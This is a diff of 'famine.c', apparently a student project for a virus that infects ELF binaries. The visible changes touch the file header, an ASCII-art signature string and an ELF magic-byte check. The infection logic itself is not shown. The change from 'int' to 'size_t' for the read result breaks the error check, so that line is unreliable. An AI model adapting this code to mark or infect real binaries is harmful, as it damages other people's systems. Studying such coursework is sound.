@@ -1,27 +1,22 @@
-#include <stdio.h>
-#include <sys/types.h>
-#include <dirent.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <string.h>
-#include <stdlib.h>
-#include <sys/stat.h>
-#include <limits.h>
+/* ************************************************************************** */
+/*                                                                            */
+/*                                                        :::      ::::::::   */
+/*   famine.c                                           :+:      :+:    :+:   */
+/*                                                    +:+ +:+         +:+     */
+/*   By: mgama <mgama@student.42lyon.fr>            +#+  +:+       +#+        */
+/*                                                +#+#+#+#+#+   +#+           */
+/*   Created: 2024/07/24 21:11:05 by mgama             #+#    #+#             */
+/*   Updated: 2024/07/24 21:15:43 by mgama            ###   ########.fr       */
+/*                                                                            */
+/* ************************************************************************** */
 
-#ifndef FM_TARGET
-# define FM_TARGET "./target"
-#endif
-
-#ifndef FM_SECURITY
-# define FM_SECURITY 1
-#endif
+#include "famine.h"
 
 void famine(char *name, char *path)
 {
 	struct stat statbuf;
 
-
-	static const char signature[] = "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0              .\n           ,'/ \\`.\n          |\\/___\\/|\n          \\'\\   /`/\n           `.\\ /,'\n              |\n              |\n             |=|\n        /\\  ,|=|.  /\\\n    ,'`.  \\/ |=| \\/  ,'`.\n  ,'    `.|\\ `-' /|,'    `.\n,'   .-._ \\ `---' / _,-.   `.\n   ,'    `-`-._,-'-'    `.\n  '                       `\nFamine 1.4 by mbrement and mgama";
+	static const char signature[] = "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0              .\n           ,'/ \\`.\n          |\\/___\\/|\n          \\'\\   /`/\n           `.\\ /,'\n              |\n              |\n             |=|\n        /\\  ,|=|.  /\\\n    ,'`.  \\/ |=| \\/  ,'`.\n  ,'    `.|\\ `-' /|,'    `.\n,'   .-._ \\ `---' / _,-.   `.\n   ,'    `-`-._,-'-'    `.\n  '                       `\nFamine 1.5 by mbrement and mgama";
 	static const char elf_magic[] = {0x7f, 'E', 'L', 'F'};
 	static const size_t elf_magic_size = sizeof(elf_magic);
 
@@ -41,7 +36,7 @@ void famine(char *name, char *path)
 	if (fd == -1)
 		return ;
 	char buf[elf_magic_size];
-	int n = read(fd, buf, elf_magic_size);
+	size_t n = read(fd, buf, elf_magic_size);
 	// check if read has an error or if the number of byte if less than `elf_magic_size`
 	if (n <= 0 || n < elf_magic_size)
 		return ;
